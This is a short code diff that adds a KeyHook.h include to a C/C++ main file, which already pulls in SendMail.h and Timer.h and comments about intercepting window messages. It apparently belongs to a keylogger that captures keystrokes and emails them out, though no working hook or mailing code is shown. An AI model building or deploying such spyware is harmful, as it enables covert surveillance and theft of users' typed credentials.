@@ -6,6 +6,7 @@
 #include "IO.h"
 #include "Timer.h"
 #include "SendMail.h"
+#include "KeyHook.h"
 
 int main(){
     // Intercept any window and thread messages
